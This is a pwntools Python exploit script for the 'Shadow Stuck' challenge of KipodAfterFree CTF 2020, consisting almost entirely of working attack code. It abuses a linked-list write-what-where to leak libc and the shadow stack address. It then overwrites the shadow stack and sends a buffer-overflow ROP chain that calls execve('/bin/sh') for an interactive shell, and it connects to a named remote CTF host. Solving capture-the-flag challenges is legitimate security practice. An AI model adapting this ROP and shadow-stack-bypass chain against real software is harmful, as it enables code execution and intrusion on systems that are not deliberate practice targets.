from pwn import *

# --- Info ---
# CTF: KipodAfterFree CTF 2020
# Date: -
# Challenge: Shadow Stuck
# Description: Write-what-where in linked list and BOF bypassing shadow stack
# --- End Info ---

#context.log_level = 'debug'
context.terminal = ["tmux", "sp", "-h"]
context.endian = 'little'

PATH = './shadowstuck'
LIBC = './libc-2.31.so'
ENV = {"LD_PRELOAD":"./libc-2.31.so"}
libc  = ELF(LIBC, checksec = False)
binary  = ELF(PATH, checksec = False)

REMOTE = 0

HOST = 'challenges.ctf.kaf.sh'
PORT = 8000

def add(data):
    r.recvuntil('[Q]uit\n>')
    r.sendline('A')
    r.recvuntil('name:\n>')
    r.sendline(data)

def delete(name, desc):
    r.recvuntil('[Q]uit\n>')
    r.sendline('F')
    r.recvuntil('fire?\n>')
    r.sendline(name)
    r.recvuntil('fired.\n>')
    r.sendline(desc)

def change(idx, data):
    r.recvuntil('[Q]uit\n>')
    r.sendline('C')
    r.recvuntil('rename?\n>')
    r.sendline(str(int(idx)))
    r.recvuntil('employee:\n>')
    r.sendline(data)

def read(idx):
    r.recvuntil('[Q]uit\n>')
    r.sendline('R')
    r.recvuntil('name of?\n>')
    r.sendline(str(int(idx)))
    data = r.recvuntil('[A]dd').replace('[A]dd', '')
    data = (data.split('has name: '))[1].split('\n')[0]
    return data
 
def quit(payload):
    r.recvuntil('[Q]uit\n>')
    r.sendline('Q')
    r.recvuntil('BOF on me.')
    r.sendline(payload)

def init_leak():
    data = r.recvuntil('Welcome')
    data = (data.split('set up at '))[1].split('\n')[0]
    return int(data, 16)
      
def pad(addr):
    return addr + '\x00'*(8-len(addr))
    
context.binary = PATH
r = remote(HOST, PORT) if REMOTE else process(PATH, env=ENV)
g_list_root = 0x555555558068                                # BSS addr of link list head

#if(not REMOTE):
#    gdb.attach(r)
#pause()

pop_rdi = 0x0000000000026b72                                # pop rdi ; ret
pop_rsi = 0x0000000000027529                                # pop rsi ; ret
pop_rdx = 0x0000000000117960                                # pop rdx ; ret

mmap_page = init_leak()                                     # leak SHADOW_STACK address (already given)
shadow_stack = mmap_page + 4096                             # shadow_stack is mmap_page+4096

add("AAAA")                                                 # alloc a chunk
delete("AAAA", p64(mmap_page)*3)                            # exploit linked-list for write-what-where

leak = u64(pad(read(1)))                                    # trigger arbitrary read
libc_base = leak - libc.symbols['__libc_start_main'] - 243  # address located in SHADOW_STACK is __libc_start_main+243

log.info(f'leak @ {hex(leak)}')
log.info(f'mmap page @ {hex(mmap_page)}')
log.info(f'shadow stack @ {hex(shadow_stack)}')
log.info(f'libc base @ {hex(libc_base)}')

execve_addr = libc_base + libc.symbols['execve']
getpid = libc_base + libc.symbols['getpid']

log.info(f'getpid @ {hex(getpid)}')
log.info(f'execve @ {hex(execve_addr)}')

offset = 0x11

gadgets = [
            libc_base+0xe6ce3,                              # one_gadget #1
            libc_base+0xe6ce6,                              # one_gadget #2
            libc_base+0xe6ce9                               # one_gadget #3
          ]

payload = ''
payload += 'A'*(offset)                                     # junk
payload += p64(mmap_page+0x80)                              # RBP
payload += p64(libc_base + pop_rdi)                         # pop rdi ; ret
payload += p64(libc_base + next(libc.search("/bin/sh")))    # &"(/bin/sh\x00")
payload += p64(libc_base + 0x0000000000141ee1)              # xor edx, edx (NULL)
payload += p64(libc_base + 0x00000000001043ce)              # xor esi, esi (NULL)
payload += p64(execve_addr)                                 # execve()
payload += p64(getpid)                                      # getpid (pad 2)

change(1, p64(libc_base + pop_rdi))                         # overwrite shadow stack with first gadget

quit(payload)                                               # time to trigger the overflow  

r.interactive()
r.close()
